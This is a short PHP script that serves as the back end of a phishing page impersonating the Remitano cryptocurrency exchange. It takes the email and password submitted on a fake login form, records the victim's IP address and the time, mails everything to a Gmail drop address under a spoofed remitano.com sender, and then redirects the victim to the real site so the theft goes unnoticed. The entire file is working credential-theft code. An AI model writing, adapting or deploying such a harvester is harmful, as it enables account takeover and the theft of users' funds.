<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'no-email';
    $password = $_POST['password'] ?? 'no-password';

    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    $message = "Captured Remitano Credentials:\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "IP Address: $ip\n";
    $message .= "Time: $timestamp\n";

    // Send to your email
    $to = "mwananchihuslerloans2@gmail.com";
    $subject = "🎯 New Phishing Login Captured";
    $headers = "From: PhishingDemo@remitano.com";

    mail($to, $subject, $message, $headers);

    // Optional: fake redirect to legit site
    header("Location: https://remitano.com");
    exit();
}
?>
